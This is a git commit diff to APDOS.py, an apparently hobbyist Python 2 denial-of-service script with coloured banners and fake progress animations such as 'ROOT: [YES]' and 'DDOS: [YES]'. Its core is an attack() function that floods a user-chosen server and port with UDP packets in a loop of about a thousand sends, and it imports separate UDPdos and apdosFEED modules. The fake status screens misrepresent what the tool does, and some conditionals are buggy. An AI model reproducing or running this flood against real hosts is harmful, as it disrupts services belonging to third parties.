3d6861c09e795727290729f267c3b1c41d4a9dfd
RussianOtter <elangs321@gmail.com>
2016-12-22 23:39:43 -0500

    Update APDOS.py
    v4.5
    -New Colors
    -Sound Fixes
    -Added Logo if sys.argv is 1
    -New UI changes
    -Code layout is more sexually attractive and clean
    -Bug Fixes
    -More bug fixes
    -4 hours spent upgrading

--- APDOS.py
+++ APDOS.py
@@ -1,61 +1,60 @@
-import socket, sys, os, time, itertools, threading, speech
-
-# start logo
+import socket, sys, os, time, itertools, threading, speech, console
+console.set_font()
+console.set_color()
+if int(sys.argv[1]) <= 1:
+	import thelogo
+console.set_font('System-Bold', 15)
 print "###################################"
-print "     _    ____  ____   ___  _____"
+console.set_color(130, 0, 0)
+print "     _    ____  ____   ___  ____ "
 print "    / \  |  _ \|  _ \ / _ \/ ___|"
 print "   / _ \ | |_) | | | | | | \___ \ "
 print "  / ___ \|  __/| |_| | |_| |___) )"
 print " /_/   \_\_|   |____/ \___/|____/ "
 print ""
+console.set_color()
 print "###################################"
 print ""
-speech.say("Welcome To APDOS")
-time.sleep(1)
-speech.say("Powered by Sav Sec")
-time.sleep(3)
+console.set_font()
 print "     -=-+- -+-=-  -=-+- -+-=-"
-print "             - APDOS -       "
+console.set_font('AmericanTypewriter', 15)
+print " " * 29 + "- APDOS -"
+console.set_font()
 print "     -=-+- -+-=-  -=-+- -+-=-"
 print "     -+-=-    Version   -=-+-"
-print "     -=:=-     GREAT    -=:=-"
-print "     -=:=-    OKAYISH   -=:=-"
-print "     -=:=-   FEEDBACKS  -=:=-"
+print "     -+-=-     GREAT    -=-+-"
+print "     -+-=-    OKAYISH   -=-+-"
+print "     -+-=-   FEEDBACKS  -=-+-"
 print "     -=-+- -+-=-  -=-+- -+-=-"
 version = raw_input("     -+-=- ")
-if (version == 'OKAYISH'):
-	print ":D"
-if (version == 'okayish'):
-	print ":D"
-server = raw_input("SERVER: ")
-port = raw_input("PORT: ")
-type = raw_input("PAYLOAD: ")
+print "     -=-+- -+-=-  -=-+- -+-=-\n"
+time.sleep(1)
+console.set_color(130, 0, 0)
+server = raw_input("[ ] SERVER: ")
+port = raw_input("[ ] PORT: ")
+type = raw_input("[ ] PAYLOAD: ")
+console.set_color()
 if type == "skip":
-	if (version == 'GREAT'):
+	type = "0x552810401b"
+	if (version == 'GREAT' or 'great' or 'g' or 'G'):
 		import UDPdos
-		print "   -=-+- -+-=-  -=-+- -+-=-"
-		print "      - APDOS COMPLETE -   "
-		print "   -=-+- -+-=-  -=-+- -+-=-"
+		import console
+		console.set_color(130, 0, 0)
+		print ""
+		print "      -=-+- -+-=-  -=-+- -+-=-"
+		print "         - APDOS COMPLETE -   "
+		print "      -=-+- -+-=-  -=-+- -+-=-"
+		console.set_color()
 		quit()
-	if (version == 'great'):
-		import UDPdos
-		print "   -=-+- -+-=-  -=-+- -+-=-"
-		print "      - APDOS COMPLETE -   "
-		print "   -=-+- -+-=-  -=-+- -+-=-"
-		quit()
-	if (version == 'feedbacks'):
+	if (version == 'feedbacks' or 'FEEDBACKS' or 'f' or 'F'):
 		import apdosFEED
-		print "   -=-+- -+-=-  -=-+- -+-=-"
-		print "      - APDOS COMPLETE -   "
-		print "   -=-+- -+-=-  -=-+- -+-=-"
+		import console
+		console.set_color()
+		print ""
+		print "      -=-+- -+-=-  -=-+- -+-=-"
+		print "         - APDOS COMPLETE -   "
+		print "      -=-+- -+-=-  -=-+- -+-=-"
 		quit()
-	if (version == 'FEEDBACKS'):
-		import apdosFEED
-		print "   -=-+- -+-=-  -=-+- -+-=-"
-		print "      - APDOS COMPLETE -   "
-		print "   -=-+- -+-=-  -=-+- -+-=-"
-		quit()
-	# -+--=- -=--+- #
 	def attack():
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
 		s.sendto(type, (server, int(port)))
@@ -64,241 +63,163 @@ if type == "skip":
 		s.close()
 	for i in range(1, 1000):
 		attack()
-	print "-=-+- -+-=-  -=-+- -+-=-"
-	print "   - APDOS COMPLETE -   "
-	print "-=-+- -+-=-  -=-+- -+-=-"
+	import console
+	console.set_color(130, 0, 0)
+	print ""
+	print "      -=-+- -+-=-  -=-+- -+-=-"
+	print "         - APDOS COMPLETE -   "
+	print "      -=-+- -+-=-  -=-+- -+-=-"
+	console.set_color()
 	sys.exit()
-	
-	
+print ""
 print "-+--=- " + server  + " -=--+-\n"
 print "-+--=- " + type + " -=--+-"
-# -+--=- -=--+- #
-
 done = False
-#here is the animation
 def animate():
-    for c in itertools.cycle(['|', '/', '-', '\\']):
-        if done:
-            break
-        sys.stdout.write('\rLocating         ' + c)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    sys.stdout.write('\rLocating    [COMPLETE]\n     ')
-
+	for c in itertools.cycle(['|', '/', '-', '\\']):
+		if done:
+			break
+		sys.stdout.write('\rLocating         ' + c)
+		sys.stdout.flush()
+		time.sleep(0.1)
+	sys.stdout.write('\rLocating    [COMPLETE]\n     ')
 t = threading.Thread(target=animate)
 t.start()
-
-#long process here
 time.sleep(5)
 done = True
-
 done1 = False
-#here is the animation
 def animate():
-    for d in itertools.cycle(['|', '/', '-', '\\']):
-        if done1:
-            break
-        sys.stdout.write('\rConnecting       ' + d)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    sys.stdout.write('\rConnecting  [COMPLETE]\n     ')
-
+	for d in itertools.cycle(['|', '/', '-', '\\']):
+		if done1:
+			break
+		sys.stdout.write('\rConnecting       ' + d)
+		sys.stdout.flush()
+		time.sleep(0.1)
+	sys.stdout.write('\rConnecting  [COMPLETE]\n     ')
 t = threading.Thread(target=animate)
 t.start()
-
-#long process here
 time.sleep(5)
 done1 = True
-
 done2 = False
-#here is the animation
 def animate():
-    for c in itertools.cycle(['|', '/', '-', '\\']):
-        if done2:
-            break
-        sys.stdout.write('\rActivation       ' + c)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    sys.stdout.write('\rActivation  [COMPLETE]\n     ')
-
+	for c in itertools.cycle(['|', '/', '-', '\\']):
+		if done2:
+			break
+		sys.stdout.write('\rActivation       ' + c)
+		sys.stdout.flush()
+		time.sleep(0.1)
+	sys.stdout.write('\rActivation  [COMPLETE]\n     ')
 t = threading.Thread(target=animate)
 t.start()
-
-#long process here
 time.sleep(3)
 done2 = True
-
 done = False
-#here is the animation
 def animate():
-    for c in itertools.cycle(['|', '/', '-', '\\']):
-        if done:
-            break
-        sys.stdout.write('\rBooting          ' + c)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    sys.stdout.write('\rBooting     [COMPLETE]\n     ')
-
+	for c in itertools.cycle(['|', '/', '-', '\\']):
+		if done:
+			break
+		sys.stdout.write('\rBooting          ' + c)
+		sys.stdout.flush()
+		time.sleep(0.1)
+	sys.stdout.write('\rBooting     [COMPLETE]\n     ')
 t = threading.Thread(target=animate)
 t.start()
-
-#long process here
 time.sleep(5)
 done = True
-
 done1 = False
-#here is the animation
 def animate():
-    for d in itertools.cycle(['|', '/', '-', '\\']):
-        if done1:
-            break
-        sys.stdout.write('\rROOT:    ' + d)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    sys.stdout.write('\rROOT:  [YES]\n')
-
+	for d in itertools.cycle(['|', '/', '-', '\\']):
+		if done1:
+			break
+		sys.stdout.write('\rROOT:    ' + d)
+		sys.stdout.flush()
+		time.sleep(0.1)
+	sys.stdout.write('\rROOT:  [YES]\n')
 t = threading.Thread(target=animate)
 t.start()
-
-#long process here
 time.sleep(2)
 done1 = True
-
-# Boots
-
 donea = False
-#here is the animation
 def animate():
-    for d in itertools.cycle(['|', '/', '-', '\\']):
-        if done:
-            break
-        sys.stdout.write('\rVPNS:    ' + d)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    sys.stdout.write('\rVPNS:  [YES]\n     ')
-
+	for d in itertools.cycle(['|', '/', '-', '\\']):
+		if done:
+			break
+		sys.stdout.write('\rVPNS:    ' + d)
+		sys.stdout.flush()
+		time.sleep(0.1)
+	try:
+		hname = socket.gethostbyaddr(server)
+		vpn = "[NO]"
+	except:
+		vpn = "[YES]"
+	sys.stdout.write('\rVPNS:  ' + vpn + '\n')
 t = threading.Thread(target=animate)
 t.start()
-
-#long process here
 time.sleep(2)
 donea = True
-
 donea = False
-#here is the animation
 def animate():
-    for d in itertools.cycle(['|', '/', '-', '\\']):
-        if done:
-            break
-        sys.stdout.write('\rAUTH:    ' + d)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    sys.stdout.write('\rAUTH:  [YES]\n     ')
-
+	for d in itertools.cycle(['|', '/', '-', '\\']):
+		if done:
+			break
+		sys.stdout.write('\rAUTH:    ' + d)
+		sys.stdout.flush()
+		time.sleep(0.1)
+	sys.stdout.write('\rAUTH:  [YES]\n     ')
 t = threading.Thread(target=animate)
 t.start()
-
-#long process here
 time.sleep(2)
 donea = True
-
 donea = False
-#here is the animation
 def animate():
-    for d in itertools.cycle(['|', '/', '-', '\\']):
-        if done:
-            break
-        sys.stdout.write('\rDDOS:    ' + d)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    sys.stdout.write('\rDDOS:  [YES]\n     ')
-
+	for d in itertools.cycle(['|', '/', '-', '\\']):
+		if done:
+			break
+		sys.stdout.write('\rDDOS:    ' + d)
+		sys.stdout.flush()
+		time.sleep(0.1)
+	sys.stdout.write('\rDDOS:  [YES]\n     ')
 t = threading.Thread(target=animate)
 t.start()
-
-#long process here
 time.sleep(2)
 done = True
-
 donea = False
-#here is the animation
 def animate():
-    for d in itertools.cycle(['|', '/', '-', '\\']):
-        if done:
-            break
-        sys.stdout.write('\rHTTP:    ' + d)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    sys.stdout.write('\rHTTP:  [YES]\n     ')
-
+	for d in itertools.cycle(['|', '/', '-', '\\']):
+		if done:
+			break
+		conn = socket.getservbyport(int(port))
+		sys.stdout.write('\r' + conn + ':' + '         ' + d)
+		sys.stdout.flush()
+		time.sleep(0.1)
+	conn = socket.getservbyport(int(port))
+	sys.stdout.write('\r' + conn + ':' + '  ' + '[YES]\n')
 t = threading.Thread(target=animate)
 t.start()
-
-#long process here
 time.sleep(2)
 donea = True
-
-done = False
-#here is the animation
-def animate():
-    for e in itertools.cycle(['|', '/', '-', '\\']):
-        if done:
-            break
-        sys.stdout.write('\rSTARTING:    ' + e)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    sys.stdout.write('\rSTARTING: [FAILURE!]\n     ')
-
-t = threading.Thread(target=animate)
-t.start()
-speech.say("Error, System Failure")
-#long process here
-time.sleep(2)
-done = True
-time.sleep(3)
-done4 = False
-#here is the animation
-def animate1():
-    for c in itertools.cycle(['|', '/', '-', '\\']):
-        if done:
-            break
-        sys.stdout.write('\rJK:    ' + c)
-        sys.stdout.flush()
-        time.sleep(0.2)
-    sys.stdout.write('\rJK: [STARTING]\n')
-
-t = threading.Thread(target=animate1)
-t.start()
-#long process here
-time.sleep(2)
-done4 = True
-if (version == 'GREAT'):
+if (version == 'GREAT' or 'great' or 'g' or 'G'):
 	import UDPdos
-	print "   -=-+- -+-=-  -=-+- -+-=-"
-	print "      - APDOS COMPLETE -   "
-	print "   -=-+- -+-=-  -=-+- -+-=-"
+	import console
+	console.set_color(130, 0, 0)
+	print ""
+	print "      -=-+- -+-=-  -=-+- -+-=-"
+	print "         - APDOS COMPLETE -   "
+	print "      -=-+- -+-=-  -=-+- -+-=-"
+	console.set_color()
 	quit()
-if (version == 'great'):
-	import UDPdos
-	print "   -=-+- -+-=-  -=-+- -+-=-"
-	print "      - APDOS COMPLETE -   "
-	print "   -=-+- -+-=-  -=-+- -+-=-"
-	quit()
-if (version == 'feedbacks'):
+if (version == 'feedbacks' or 'FEEDBACKS' or 'f' or 'F'):
 	import apdosFEED
-	print "   -=-+- -+-=-  -=-+- -+-=-"
-	print "      - APDOS COMPLETE -   "
-	print "   -=-+- -+-=-  -=-+- -+-=-"
+	import console
+	console.set_color(130, 0, 0)
+	print ""
+	print "      -=-+- -+-=-  -=-+- -+-=-"
+	print "         - APDOS COMPLETE -   "
+	print "      -=-+- -+-=-  -=-+- -+-=-"
+	console.set_color()
 	quit()
-if (version == 'FEEDBACKS'):
-	import apdosFEED
-	print "   -=-+- -+-=-  -=-+- -+-=-"
-	print "      - APDOS COMPLETE -   "
-	print "   -=-+- -+-=-  -=-+- -+-=-"
-	quit()
-# -+--=- -=--+- #
 def attack():  
-	#pid = os.fork()  
+	type = "0x7392a88716b"
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
 	s.sendto(type, (server, int(port)))
 	print "Data: " + type
@@ -306,7 +227,10 @@ def attack():
 	s.close()
 for i in range(1, 1000):
 	attack()
-print "-=-+- -+-=-  -=-+- -+-=-"
-print "   - APDOS COMPLETE -   "
-print "-=-+- -+-=-  -=-+- -+-=-"
+console.set_color(130, 0, 0)
+print ""
+print "      -=-+- -+-=-  -=-+- -+-=-"
+print "         - APDOS COMPLETE -   "
+print "      -=-+- -+-=-  -=-+- -+-=-"
+console.set_color()
 sys.exit()
